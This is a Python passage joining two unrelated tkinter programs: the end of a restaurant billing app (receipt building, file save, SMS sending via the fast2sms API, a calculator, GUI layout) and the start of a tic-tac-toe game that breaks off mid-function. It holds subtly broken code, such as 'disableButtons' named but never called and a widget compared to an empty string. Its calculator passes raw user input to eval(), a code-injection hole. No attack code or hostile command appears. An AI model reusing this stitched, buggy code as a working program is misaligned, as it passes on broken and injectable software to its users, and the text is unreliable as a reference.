    if service_charge_cost.get() != "":
        service_charge_cost.delete(0, "end")
        service_charge_cost.insert(0, "10")
    else:
        service_charge_cost.insert(0, "10")

    fc = int(foods_cost.get())
    dc = int(drinks_cost.get())

    total_paid_tax = fc + dc
    total_paid_tax = total_paid_tax * 8 / 100

    if paid_tax_cost != "":
        paid_tax_cost.delete(0, "end")
        paid_tax_cost.insert(0, total_paid_tax)
    else:
        paid_tax_cost.insert(0, total_paid_tax)

    total_sub_cost = fc + dc + int(service_charge_cost.get())

    if sub_total_cost.get() != "":
        sub_total_cost.delete(0, "end")
        sub_total_cost.insert(0, total_sub_cost)
    else:
        sub_total_cost.insert(0, total_sub_cost)

    if total_cost_cost.get() != "":
        total_cost_cost.delete(0, "end")
        total_cost_cost.insert(0, float(total_sub_cost + total_paid_tax))
    else:
        total_cost_cost.insert(0, float(total_sub_cost + total_paid_tax))

    # =====================  Total Bill Receipt ===========================
    date = datetime.now().date()
    if bill_details.get(1.0, "end") != "":
        bill_details.delete(1.0, "end")
        bill_details.insert(1.0,
                            f" Billno-{random.randint(100, 1000)}\t{date}  =====================  Items(q) \t \tAmount  ===================== \n {'Lassi (' + str(lassi_q) + ')' + '         ' + str(int(lassi_q) * lassi_price) + '   ' if lassi_var.get() == 1 else ''}{'coffee (' + str(coffee_q) + ')' + '        ' + str(int(coffee_q) * coffee_price) + '  ' if coffee_var.get() == 1 else ''}{' tea (' + str(tea_q) + ')' + '           ' + str(int(tea_q) * tea_price) + '  ' if tea_var.get() == 1 else ''}{' juice (' + str(juice_q) + ')' + '         ' + str(int(juice_q) * juice_price) + '   ' if juice_var.get() == 1 else ''}{'shakes(' + str(shakes_q) + ')' + '         ' + str(int(shakes_q) * shakes_price) + '   ' if shakes_var.get() == 1 else ''}{'milk(' + str(milk_q) + ')' + '           ' + str(int(milk_q) * milk_price) + '   ' if milk_var.get() == 1 else ''}{'shikanji(' + str(shikanji_q) + ')' + '     ' + str(int(shikanji_q) * shikanji_price) + '     ' if shikanji_var.get() == 1 else ''}{'redbull(' + str(redbull_q) + ')' + '     ' + str(int(redbull_q) * redbull_price) + '     ' if redbull_var.get() == 1 else ''}{'roti(' + str(roti_q) + ')' + '          ' + str(int(roti_q) * roti_price) + '     ' if roti_var.get() == 1 else ''}{'dal makhni(' + str(dal_makhni_q) + ')' + '     ' + str(int(dal_makhni_q) * dal_makhni_price) + '  ' if dal_makhni_var.get() == 1 else ''}{'mutter panner(' + str(mutter_panner_q) + ')' + '  ' + str(int(mutter_panner_q) * mutter_panner_price) + '  ' if mutter_panner_var.get() == 1 else ''}{'paratha(' + str(paratha_q) + ')' + '        ' + str(int(paratha_q) * paratha_price) + '   ' if paratha_var.get() == 1 else ''}{'mix veg(' + str(mix_veg_q) + ')' + '        ' + str(int(mix_veg_q) * mix_veg_price) + '   ' if mix_veg_var.get() == 1 else ''}{'omelete(' + str(omelete_q) + ')' + '        ' + str(int(omelete_q) * omelete_price) + '   ' if omelete_var.get() == 1 else ''}{'veg biryani(' + str(veg_biryani_q) + ')' + '    ' + str(int(veg_biryani_q) * veg_biryani_price) + '  ' if veg_biryani_var.get() == 1 else ''}{'rice(' + str(rice_q) + ')' + '          ' + str(int(rice_q) * rice_price) + '    ' if rice_var.get() == 1 else ''}service charge    {service_charge_cost.get()}\n tax paid        {paid_tax_cost.get()}\n ===================== \n total          {total_cost_cost.get()}\n =====================")

        # ================== End  =============================


# ========= Save button Code ================

def save():
    root.filename = filedialog.asksaveasfile(mode="w", defaultextension='.txt')
    if root.filename is None:
        return
    file_save = str(bill_details.get(1.0, END))
    root.filename.write(file_save)
    root.filename.close()


# =========== End =====================


# ============= Drinks checkbutton validation =================
def lassi_chk():
    if lassi_var.get() == 1:
        lassi_qty['state'] = "normal"
        lassi_qty['bg'] = '#248aa2'
        lassi_qty['fg'] = "white"

    else:
        lassi_qty['state'] = "disabled"


def coffee_chk():
    if coffee_var.get() == 1:
        coffee_qty['state'] = "normal"
        coffee_qty['bg'] = '#248aa2'
        coffee_qty['fg'] = "white"
    else:
        coffee_qty['state'] = "disabled"


def tea_chk():
    if tea_var.get() == 1:
        tea_qty['state'] = "normal"
        tea_qty['bg'] = '#248aa2'
        tea_qty['fg'] = "white"
    else:
        tea_qty['state'] = "disabled"


def juice_chk():
    if juice_var.get() == 1:
        juice_qty['state'] = "normal"
        juice_qty['bg'] = '#248aa2'
        juice_qty['fg'] = "white"
    else:
        juice_qty['state'] = "disabled"


def shakes_chk():
    if shakes_var.get() == 1:
        shakes_qty['state'] = "normal"
        shakes_qty['bg'] = '#248aa2'
        shakes_qty['fg'] = "white"
    else:
        shakes_qty['state'] = "disabled"


def milk_chk():
    if milk_var.get() == 1:
        milk_qty['state'] = "normal"
        milk_qty['bg'] = '#248aa2'
        milk_qty['fg'] = "white"
    else:
        milk_qty['state'] = "disabled"


def shikanji_chk():
    if shikanji_var.get() == 1:
        shikanji_qty['state'] = "normal"
        shikanji_qty['bg'] = '#248aa2'
        shikanji_qty['fg'] = "white"
    else:
        shikanji_qty['state'] = "disabled"


def redbull_chk():
    if redbull_var.get() == 1:
        redbull_qty['state'] = "normal"
        redbull_qty['bg'] = '#248aa2'
        redbull_qty['fg'] = "white"
    else:
        redbull_qty['state'] = "disabled"


# ================== end==================


# === Foods checkbutton validation ================

def roti_chk():
    if roti_var.get() == 1:
        roti_qty['state'] = "normal"
        roti_qty['bg'] = '#248aa2'
        roti_qty['fg'] = "white"

    else:
        roti_qty['state'] = "disabled"


def dal_makhni_chk():
    if dal_makhni_var.get() == 1:
        dal_makhni_qty['state'] = "normal"
        dal_makhni_qty['bg'] = '#248aa2'
        dal_makhni_qty['fg'] = "white"
    else:
        dal_makhni_qty['state'] = "disabled"


def mutter_panner_chk():
    if mutter_panner_var.get() == 1:
        mutter_panner_qty['state'] = "normal"
        mutter_panner_qty['bg'] = '#248aa2'
        mutter_panner_qty['fg'] = "white"
    else:
        mutter_panner_qty['state'] = "disabled"


def paratha_chk():
    if paratha_var.get() == 1:
        paratha_qty['state'] = "normal"
        paratha_qty['bg'] = '#248aa2'
        paratha_qty['fg'] = "white"
    else:
        paratha_qty['state'] = "disabled"


def mix_veg_chk():
    if mix_veg_var.get() == 1:
        mix_veg_qty['state'] = "normal"
        mix_veg_qty['bg'] = '#248aa2'
        mix_veg_qty['fg'] = "white"
    else:
        mix_veg_qty['state'] = "disabled"


def omelete_chk():
    if omelete_var.get() == 1:
        omelete_qty['state'] = "normal"
        omelete_qty['bg'] = '#248aa2'
        omelete_qty['fg'] = "white"
    else:
        omelete_qty['state'] = "disabled"


def veg_biryani_chk():
    if veg_biryani_var.get() == 1:
        veg_biryani_qty['state'] = "normal"
        veg_biryani_qty['bg'] = '#248aa2'
        veg_biryani_qty['fg'] = "white"
    else:
        veg_biryani_qty['state'] = "disabled"


def rice_chk():
    if rice_var.get() == 1:
        rice_qty['state'] = "normal"
        rice_qty['bg'] = '#248aa2'
        rice_qty['fg'] = "white"
    else:
        rice_qty['state'] = "disabled"


# ============== end ==========================


# ===== Calculator code ================

def nine():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "9")
    else:
        result.insert("end", "9")


def eight():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "8")
    else:
        result.insert("end", "8")


def seven():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "7")
    else:
        result.insert("end", "7")


def six():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "6")
    else:
        result.insert("end", "6")


def five():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "5")
    else:
        result.insert("end", "5")


def four():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "4")
    else:
        result.insert("end", "4")


def three():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "3")
    else:
        result.insert("end", "3")


def two():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "2")
    else:
        result.insert("end", "2")


def one():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "1")
    else:
        result.insert("end", "1")


def zero():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "0")
    else:
        result.insert("end", "0")


def plus():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "+")
    else:
        result.insert("end", "+")


def minus():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "-")
    else:
        result.insert("end", "-")


def mul():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "*")
    else:
        result.insert("end", "*")


def divide():
    if 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")
        result.insert("end", "/")
    else:
        result.insert("end", "/")


def equal():
    if result.get() == "":
        result.insert("end", "error")
    elif result.get()[0] == "0" or result.get()[0] == "+" or result.get()[0] == "*" or result.get()[0] == "/":
        result.delete(0, "end")
        result.insert("end", "error")
    elif 'error' in result.get() or '=' in result.get():
        result.delete(0, "end")


    else:
        res = result.get()
        res = eval(res)
        result.insert("end", " = ")
        result.insert("end", res)


def clear():
    result.delete(0, "end")


# ========== end ========================

# ====== Send button code ====================
def Send():
    root = tk.Tk()
    root.geometry('300x400')
    root['bg'] = "white"

    frame4 = Frame(root, width=300, height=60, relief=RIDGE, borderwidth=5, bg='#248aa2', highlightbackground="white",
                   highlightcolor="white", highlightthickness=2)
    frame4.place(x=0, y=0)

    l2 = Label(frame4, text="Send Bill", font=('roboto', 22, 'bold'), bg='#248aa2', fg="#ffffff")
    l2.place(x=85, y=1)

    frame5 = Frame(root, width=300, height=340, relief=RIDGE, borderwidth=5, bg='#248aa2', highlightbackground="white",
                   highlightcolor="white", highlightthickness=2)
    frame5.place(x=0, y=55)

    innerframe5 = Frame(frame5, width=285, height=325, relief=RIDGE, borderwidth=3, bg='#248aa2',
                        highlightbackground="white", highlightcolor="white", highlightthickness=2)
    innerframe5.place(x=0, y=0)

    l3 = LabelFrame(innerframe5, text="Send Bill Through SMS", width=270, height=310, borderwidth=3,
                    font=('verdana', 10, 'bold'), fg='#248aa2', relief=RIDGE, highlightbackground="white",
                    highlightcolor="white", highlightthickness=2)
    l3.place(x=2, y=2)

    l4 = Label(innerframe5, text="Phone Number", font=('verdana', 10, 'bold'))
    l4.place(x=40, y=40)

    number = Entry(innerframe5, width=30, borderwidth=2)
    number.place(x=40, y=70)

    l5 = Label(innerframe5, text="Bill Details", font=('verdana', 10, 'bold'))
    l5.place(x=40, y=100)

    b_detail = ScrolledText(innerframe5, width=23, height=7, relief=RIDGE, borderwidth=3)
    b_detail.place(x=40, y=130)

    b_detail.insert(1.0, bill_details.get(1.0, END))

    def send_bill():
        ph_number = number.get()
        messages = b_detail.get("1.0", "end-1c")

        if ph_number == "":
            messagebox.showerror("Error", 'Please fill the phone number')
        elif messages == "":
            messagebox.showerror("Error", 'Bill Details is empty')
        else:
            url = "https://www.fast2sms.com/dev/bulk"
            api = ""  # go to fast2sms.com signup to get the free api and put it into here in api variable
            querystring = {"authorization": api, "sender_id": "FSTSMS", "message": messages, "language": "english",
                           "route": "p", "numbers": ph_number}

            headers = {
                'cache-control': "no-cache"
            }
            requests.request("GET", url, headers=headers, params=querystring)

            messagebox.showinfo("Send SMS", 'Bill has been send to your successfully')

    send_msg = Button(innerframe5, text="Send Bill", relief=RAISED, borderwidth=2, font=('verdana', 8, 'bold'),
                      bg='#248aa2', fg="white", padx=20, command=send_bill)
    send_msg.place(x=100, y=255)

    root.mainloop()


# ============ end =====================


# ==== Exit button code =================
def exit():
    message = messagebox.askquestion('Notepad', "Do you want to exit the application")
    if message == "yes":
        root.destroy()
    else:
        "return"


# ======== end =======================


# ==== clear button code ============
def cleared_bill():
    # ========== Drinks ===========
    lassi_qty.delete(0, 'end')
    lassi.deselect()
    lassi_qty['state'] = "disabled"
    coffee_qty.delete(0, 'end')
    coffee.deselect()
    coffee_qty['state'] = "disabled"
    tea_qty.delete(0, 'end')
    tea.deselect()
    tea_qty['state'] = "disabled"
    juice_qty.delete(0, 'end')
    juice.deselect()
    juice_qty['state'] = "disabled"
    shakes_qty.delete(0, 'end')
    shakes.deselect()
    shakes_qty['state'] = "disabled"
    milk_qty.delete(0, 'end')
    milk.deselect()
    milk_qty['state'] = "disabled"
    shikanji_qty.delete(0, 'end')
    shikanji.deselect()
    shikanji_qty['state'] = "disabled"
    redbull_qty.delete(0, 'end')
    redbull.deselect()
    redbull_qty['state'] = "disabled"
    # ========== Drinks ===========
    roti_qty.delete(0, 'end')
    roti.deselect()
    roti_qty['state'] = "disabled"
    dal_makhni_qty.delete(0, 'end')
    dal_makhni.deselect()
    dal_makhni_qty['state'] = "disabled"
    mutter_panner_qty.delete(0, 'end')
    mutter_panner.deselect()
    mutter_panner_qty['state'] = "disabled"
    paratha_qty.delete(0, 'end')
    paratha.deselect()
    paratha_qty['state'] = "disabled"
    mix_veg_qty.delete(0, 'end')
    mix_veg.deselect()
    mix_veg_qty['state'] = "disabled"
    omelete_qty.delete(0, 'end')
    omelete.deselect()
    omelete_qty['state'] = "disabled"
    veg_biryani_qty.delete(0, 'end')
    veg_biryani.deselect()
    veg_biryani_qty['state'] = "disabled"
    rice_qty.delete(0, 'end')
    rice.deselect()
    rice_qty['state'] = "disabled"
    # ========== Total cost ===========
    drinks_cost.delete(0, 'end')
    foods_cost.delete(0, 'end')
    service_charge_cost.delete(0, 'end')
    paid_tax_cost.delete(0, 'end')
    sub_total_cost.delete(0, 'end')
    total_cost_cost.delete(0, 'end')
    # ========== Bill Details ============
    bill_details.delete(1.0, 'end')


# ======== End =============


# ===== Main Window code =================
root = tk.Tk()
root.geometry('650x400')
root.maxsize(650, 390)
root.minsize(650, 390)
root.title("Restaurent Management System")

frame = Frame(root, width=650, height=70, relief=RIDGE, borderwidth=5, bg='#248aa2')
frame.place(x=0, y=0)

l1 = Label(frame, text="Restaurent Management System", font=('roboto', 30, 'bold'), bg='#248aa2', fg="#ffffff")
l1.place(x=10, y=4)

# ======================================================================

frame1 = Frame(root, width=450, height=230, relief=RIDGE, borderwidth=5, bg='#248aa2')
frame1.place(x=0, y=70)

innerframe1 = Frame(frame1, width=150, height=220, relief=RIDGE, borderwidth=3, bg='#248aa2',
                    highlightbackground="white", highlightcolor="white", highlightthickness=2)
innerframe1.place(x=0, y=0)

drinks = LabelFrame(innerframe1, text="Drinks", width=135, height=205, borderwidth=3, font=('verdana', 10, 'bold'),
                    fg='#248aa2', relief=RIDGE, highlightbackground="white", highlightcolor="white",
                    highlightthickness=2)
drinks.place(x=2, y=2)

lassi_var = IntVar()
lassi = Checkbutton(drinks, text="Lassi", variable=lassi_var, font=('verdana', 8, 'bold'), onvalue=1, offvalue=0,
                    command=lassi_chk)
lassi.place(x=2, y=2)

lassi_qty = Entry(drinks, width=7, borderwidth=4, relief=SUNKEN, state='disabled')
lassi_qty.place(x=74, y=2)
lassi_qty.insert(0, "0")

coffee_var = IntVar()
coffee = Checkbutton(drinks, text="Coffee", variable=coffee_var, font=('verdana', 8, 'bold'), onvalue=1, offvalue=0,
                     command=coffee_chk)
coffee.place(x=2, y=22)

coffee_qty = Entry(drinks, width=7, borderwidth=4, relief=SUNKEN, state="disabled")
coffee_qty.place(x=74, y=22)

tea_var = IntVar()
tea = Checkbutton(drinks, text="Tea", variable=tea_var, font=('verdana', 8, 'bold'), onvalue=1, offvalue=0,
                  command=tea_chk)
tea.place(x=2, y=44)
tea_qty = Entry(drinks, width=7, borderwidth=4, relief=SUNKEN, state="disabled")
tea_qty.place(x=74, y=44)

juice_var = IntVar()
juice = Checkbutton(drinks, text="Juice", variable=juice_var, font=('verdana', 8, 'bold'), onvalue=1, offvalue=0,
                    command=juice_chk)
juice.place(x=2, y=66)
juice_qty = Entry(drinks, width=7, borderwidth=4, relief=SUNKEN, state="disabled")
juice_qty.place(x=74, y=66)

shakes_var = IntVar()
shakes = Checkbutton(drinks, text="Shakes", variable=shakes_var, font=('verdana', 8, 'bold'), onvalue=1, offvalue=0,
                     command=shakes_chk)
shakes.place(x=2, y=88)
shakes_qty = Entry(drinks, width=7, borderwidth=4, relief=SUNKEN, state="disabled")
shakes_qty.place(x=74, y=88)

milk_var = IntVar()
milk = Checkbutton(drinks, text="Milk", variable=milk_var, font=('verdana', 8, 'bold'), onvalue=1, offvalue=0,
                   command=milk_chk)
milk.place(x=2, y=110)
milk_qty = Entry(drinks, width=7, borderwidth=4, relief=SUNKEN, state="disabled")
milk_qty.place(x=74, y=110)

shikanji_var = IntVar()
shikanji = Checkbutton(drinks, text="Shikanji", variable=shikanji_var, font=('verdana', 8, 'bold'), onvalue=1,
                       offvalue=0, command=shikanji_chk)
shikanji.place(x=2, y=132)
shikanji_qty = Entry(drinks, width=7, borderwidth=4, relief=SUNKEN, state="disabled")
shikanji_qty.place(x=74, y=132)

redbull_var = IntVar()
redbull = Checkbutton(drinks, text="Redbull", variable=redbull_var, font=('verdana', 8, 'bold'), onvalue=1, offvalue=0,
                      command=redbull_chk)
redbull.place(x=2, y=154)
redbull_qty = Entry(drinks, width=7, borderwidth=4, relief=SUNKEN, state="disabled")
redbull_qty.place(x=74, y=154)

innerframe2 = Frame(frame1, width=290, height=220, relief=RIDGE, borderwidth=3, bg='#248aa2',
                    highlightbackground="white", highlightcolor="white", highlightthickness=2)
innerframe2.place(x=151, y=0)

foods = LabelFrame(innerframe2, text="Foods", width=275, height=205, borderwidth=3, font=('verdana', 10, 'bold'),
                   fg='#248aa2', relief=RIDGE, highlightbackground="white", highlightcolor="white",
                   highlightthickness=2)
foods.place(x=2, y=2)

roti_var = IntVar()
roti = Checkbutton(foods, text="Roti", variable=roti_var, font=('verdana', 8, 'bold'), command=roti_chk)
roti.place(x=2, y=2)
roti_qty = Entry(foods, width=15, borderwidth=4, relief=SUNKEN, state="disabled")
roti_qty.place(x=140, y=2)

dal_makhni_var = IntVar()
dal_makhni = Checkbutton(foods, text="Dal Makhni", variable=dal_makhni_var, font=('verdana', 8, 'bold'),
                         command=dal_makhni_chk)
dal_makhni.place(x=2, y=22)
dal_makhni_qty = Entry(foods, width=15, borderwidth=4, relief=SUNKEN, state="disabled")
dal_makhni_qty.place(x=140, y=22)

mutter_panner_var = IntVar()
mutter_panner = Checkbutton(foods, text="Mutter Panner", variable=mutter_panner_var, font=('verdana', 8, 'bold'),
                            command=mutter_panner_chk)
mutter_panner.place(x=2, y=44)
mutter_panner_qty = Entry(foods, width=15, borderwidth=4, relief=SUNKEN, state="disabled")
mutter_panner_qty.place(x=140, y=44)

paratha_var = IntVar()
paratha = Checkbutton(foods, text="Paratha", variable=paratha_var, font=('verdana', 8, 'bold'), command=paratha_chk)
paratha.place(x=2, y=66)
paratha_qty = Entry(foods, width=15, borderwidth=4, relief=SUNKEN, state="disabled")
paratha_qty.place(x=140, y=66)

mix_veg_var = IntVar()
mix_veg = Checkbutton(foods, text="Mix Veg", variable=mix_veg_var, font=('verdana', 8, 'bold'), command=mix_veg_chk)
mix_veg.place(x=2, y=88)
mix_veg_qty = Entry(foods, width=15, borderwidth=4, relief=SUNKEN, state="disabled")
mix_veg_qty.place(x=140, y=88)

omelete_var = IntVar()
omelete = Checkbutton(foods, text="Omelete", variable=omelete_var, font=('verdana', 8, 'bold'), command=omelete_chk)
omelete.place(x=2, y=110)
omelete_qty = Entry(foods, width=15, borderwidth=4, relief=SUNKEN, state="disabled")
omelete_qty.place(x=140, y=110)

veg_biryani_var = IntVar()
veg_biryani = Checkbutton(foods, text="Veg Biryani", variable=veg_biryani_var, font=('verdana', 8, 'bold'),
                          command=veg_biryani_chk)
veg_biryani.place(x=2, y=132)
veg_biryani_qty = Entry(foods, width=15, borderwidth=4, relief=SUNKEN, state="disabled")
veg_biryani_qty.place(x=140, y=132)

rice_var = IntVar()
rice = Checkbutton(foods, text="Rice", variable=rice_var, font=('verdana', 8, 'bold'), command=rice_chk)
rice.place(x=2, y=154)
rice_qty = Entry(foods, width=15, borderwidth=4, relief=SUNKEN, state="disabled")
rice_qty.place(x=140, y=154)

# =================================================================

frame2 = Frame(root, width=450, height=90, relief=RIDGE, borderwidth=5, bg='#248aa2')
frame2.place(x=0, y=300)

innerframe3 = Frame(frame2, width=440, height=80, relief=RIDGE, borderwidth=3, bg='#248aa2',
                    highlightbackground="white", highlightcolor="white", highlightthickness=2)
innerframe3.place(x=0, y=0)

cost_of_drinks = Label(innerframe3, text="Cost of Drinks", font=('verdana', 8, 'bold'))
cost_of_drinks.place(x=2, y=2)
drinks_cost = Entry(innerframe3, width=13, borderwidth=4, relief=SUNKEN)
drinks_cost.place(x=130, y=0)

cost_of_foods = Label(innerframe3, text="Cost of Foods", font=('verdana', 8, 'bold'))
cost_of_foods.place(x=2, y=24)
foods_cost = Entry(innerframe3, width=13, borderwidth=4, relief=SUNKEN)
foods_cost.place(x=130, y=22)

service_charge = Label(innerframe3, text="Service Charge", font=('verdana', 8, 'bold'))
service_charge.place(x=2, y=46)
service_charge_cost = Entry(innerframe3, width=13, borderwidth=4, relief=SUNKEN)
service_charge_cost.place(x=130, y=44)

paid_tax = Label(innerframe3, text="Paid Tax", font=('verdana', 8, 'bold'))
paid_tax.place(x=250, y=2)
paid_tax_cost = Entry(innerframe3, width=13, borderwidth=4, relief=SUNKEN)
paid_tax_cost.place(x=330, y=0)

sub_total = Label(innerframe3, text="Sub Total", font=('verdana', 8, 'bold'))
sub_total.place(x=250, y=24)
sub_total_cost = Entry(innerframe3, width=13, borderwidth=4, relief=SUNKEN)
sub_total_cost.place(x=330, y=22)

total_cost = Label(innerframe3, text="Total Cost", font=('verdana', 8, 'bold'))
total_cost.place(x=250, y=46)
total_cost_cost = Entry(innerframe3, width=13, borderwidth=4, relief=SUNKEN)
total_cost_cost.place(x=330, y=44)

# ============================================================================
frame3 = Frame(root, width=200, height=320, relief=RIDGE, borderwidth=5, bg='#248aa2')
frame3.place(x=450, y=70)

innerframe4 = Frame(frame3, width=190, height=310, relief=RIDGE, borderwidth=3, bg='#248aa2',
                    highlightbackground="white", highlightcolor="white", highlightthickness=2)
innerframe4.place(x=0, y=0)

result = Entry(innerframe4, width=28, relief=SUNKEN, borderwidth=3)
result.place(x=2, y=0)

nine = Button(innerframe4, text="9", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
              fg="white", command=nine)
nine.place(x=0, y=24)
eight = Button(innerframe4, text="8", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
               fg="white", command=eight)
eight.place(x=48, y=24)
seven = Button(innerframe4, text="7", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
               fg="white", command=seven)
seven.place(x=96, y=24)
plus = Button(innerframe4, text="+", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='white',
              fg="black", command=plus)
plus.place(x=144, y=24)

six = Button(innerframe4, text="6", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
             fg="white", command=six)
six.place(x=0, y=50)
five = Button(innerframe4, text="5", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
              fg="white", command=five)
five.place(x=48, y=50)
four = Button(innerframe4, text="4", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
              fg="white", command=four)
four.place(x=96, y=50)
minus = Button(innerframe4, text="-", padx=8, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='white',
               fg="black", command=minus)
minus.place(x=144, y=50)

three = Button(innerframe4, text="3", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
               fg="white", command=three)
three.place(x=0, y=76)
two = Button(innerframe4, text="2", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
             fg="white", command=two)
two.place(x=48, y=76)
one = Button(innerframe4, text="1", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
             fg="white", command=one)
one.place(x=96, y=76)
multiply = Button(innerframe4, text="*", padx=7, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='white',
                  fg="black", command=mul)
multiply.place(x=144, y=76)

zero = Button(innerframe4, text="0", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
              fg="white", command=zero)
zero.place(x=0, y=102)
clear = Button(innerframe4, text="C", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
               fg="white", command=clear)
clear.place(x=48, y=102)
equal = Button(innerframe4, text="=", padx=15, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='#248aa2',
               fg="white", command=equal)
equal.place(x=96, y=102)
divide = Button(innerframe4, text="/", padx=7, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'), bg='white',
                fg="black", command=divide)
divide.place(x=144, y=102)

bill_details = ScrolledText(innerframe4, width=23, height=9, relief=SUNKEN, borderwidth=3, font=('courier', 9, ''))
bill_details.place(x=0, y=130)

total = Button(innerframe4, text="Total", relief=RAISED, borderwidth=2, font=('verdana', 8, 'bold'), bg='#248aa2',
               fg="white", command=total_bills)
total.place(x=0, y=275)

save = Button(innerframe4, text="Save", relief=RAISED, borderwidth=2, font=('verdana', 8, 'bold'), bg='#248aa2',
              fg="white", command=save)
save.place(x=43, y=275)

send = Button(innerframe4, text="Send", relief=RAISED, borderwidth=2, font=('verdana', 8, 'bold'), bg='#248aa2',
              fg="white", command=Send)
send.place(x=82, y=275)

exit = Button(innerframe4, text="Exit", relief=RAISED, borderwidth=2, font=('verdana', 8, 'bold'), bg='#248aa2',
              fg="white", command=exit)
exit.place(x=124, y=275)

clr = Button(innerframe4, text="C", relief=RAISED, borderwidth=2, font=('verdana', 8, 'bold'), bg='#248aa2', fg="white",
             command=cleared_bill)
clr.place(x=160, y=275)

root.mainloop()

# ==============xxxxxxxxxxxxxxxxxxxx==== End code Here =======xxxxxxxxxxxxxxxx==========


from tkinter import *
from tkinter import messagebox

root = Tk()
root.title('Tic Tac Toe Game')

# Player 1 [X] starts first, Player 2 [O] continues
clicked = True
count = 0


# To disable all the buttons when someone has won the game
def disableButtons():
    button1.config(state=DISABLED)
    button2.config(state=DISABLED)
    button3.config(state=DISABLED)

    button4.config(state=DISABLED)
    button5.config(state=DISABLED)
    button6.config(state=DISABLED)

    button7.config(state=DISABLED)
    button8.config(state=DISABLED)
    button9.config(state=DISABLED)


# To check whether did anyone won the game and restart the game when someone won the game
def checkWinner():
    global winner
    winner = False

    # Player 1 [X] winning patterns
    if button1["text"] == "X" and button2["text"] == "X" and button3["text"] == "X":
        button1.config(bg="#80ffaa")  # [X][X][X]
        button2.config(bg="#80ffaa")  # [O][O][ ]
        button3.config(bg="#80ffaa")  # [ ][ ][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 1 is the Winner!")
        disableButtons
        start()

    elif button4["text"] == "X" and button5["text"] == "X" and button6["text"] == "X":
        button4.config(bg="#80ffaa")  # [O][O][ ]
        button5.config(bg="#80ffaa")  # [X][X][X]
        button6.config(bg="#80ffaa")  # [ ][ ][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 1 is the Winner!")
        disableButtons
        start()

    elif button7["text"] == "X" and button8["text"] == "X" and button9["text"] == "X":
        button7.config(bg="#80ffaa")  # [ ][ ][ ]
        button8.config(bg="#80ffaa")  # [O][O][ ]
        button9.config(bg="#80ffaa")  # [X][X][X]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 1 is the Winner!")
        disableButtons
        start()

    elif button1["text"] == "X" and button4["text"] == "X" and button7["text"] == "X":
        button1.config(bg="#80ffaa")  # [X][O][ ]
        button4.config(bg="#80ffaa")  # [X][O][ ]
        button7.config(bg="#80ffaa")  # [X][ ][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 1 is the Winner!")
        disableButtons
        start()

    elif button2["text"] == "X" and button5["text"] == "X" and button8["text"] == "X":
        button2.config(bg="#80ffaa")  # [O][X][ ]
        button5.config(bg="#80ffaa")  # [O][X][ ]
        button8.config(bg="#80ffaa")  # [ ][X][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 1 is the Winner!")
        disableButtons
        start()

    elif button3["text"] == "X" and button6["text"] == "X" and button9["text"] == "X":
        button3.config(bg="#80ffaa")  # [ ][O][X]
        button6.config(bg="#80ffaa")  # [ ][O][X]
        button9.config(bg="#80ffaa")  # [ ][ ][X]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 1 is the Winner!")
        disableButtons
        start()

    elif button1["text"] == "X" and button5["text"] == "X" and button9["text"] == "X":
        button1.config(bg="#80ffaa")  # [X][O][ ]
        button5.config(bg="#80ffaa")  # [ ][X][ ]
        button9.config(bg="#80ffaa")  # [ ][O][X]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 1 is the Winner!")
        disableButtons
        start()

    elif button3["text"] == "X" and button5["text"] == "X" and button7["text"] == "X":
        button3.config(bg="#80ffaa")  # [ ][O][X]
        button5.config(bg="#80ffaa")  # [ ][X][ ]
        button7.config(bg="#80ffaa")  # [X][O][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 1 is the Winner!")
        disableButtons
        start()

    # Player 2 [O] winning patterns
    elif button1["text"] == "O" and button2["text"] == "O" and button3["text"] == "O":
        button1.config(bg="#80ffaa")  # [O][O][O]
        button2.config(bg="#80ffaa")  # [X][X][ ]
